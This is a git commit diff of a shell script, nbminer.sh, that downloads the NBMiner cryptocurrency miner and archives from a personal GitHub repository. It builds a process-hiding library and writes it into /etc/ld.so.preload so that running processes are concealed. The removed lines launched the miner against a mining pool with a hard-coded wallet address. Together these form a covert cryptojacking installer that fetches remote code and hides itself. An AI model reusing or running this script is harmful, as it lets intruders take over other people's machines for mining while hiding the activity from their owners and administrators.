c503fdc6f092b6f445f01d72cf215c0acec549a0
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2020-12-03 20:36:31 +0200

    Update nbminer.sh

--- nbminer.sh
+++ nbminer.sh
@@ -1,11 +1,18 @@
+#!/bin/sh
+wget https://github.com/NebuTech/NBMiner/releases/download/v34.4/NBMiner_34.4_Linux.tgz
+tar -xvzf NBMiner_34.4_Linux.tgz
+cd NBMiner_Linux
+wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/PowETH.zip
+unzip PowETH.zip
+chmod +x start_2miners.sh
+chmod +x start_flypool.sh
+chmod +x start_hiveon.sh
+chmod +x start_ravenminerpplns.sh
+chmod +x start_ravenminerpps.sh
 wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicNb.zip
 unzip magicNb.zip
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-
-wget https://github.com/NebuTech/NBMiner/releases/download/v34.4/NBMiner_34.4_Linux.tgz
-tar -xvzf NBMiner_34.4_Linux.tgz
-cd NBMiner_Linux
-./nbminer -a ethash -o ethproxy+ssl://naw-eth.hiveon.net:24443 -u 0x8CB8003E428D0Fd7693D22f576A212403728c64a.NBMiner -log
+ls
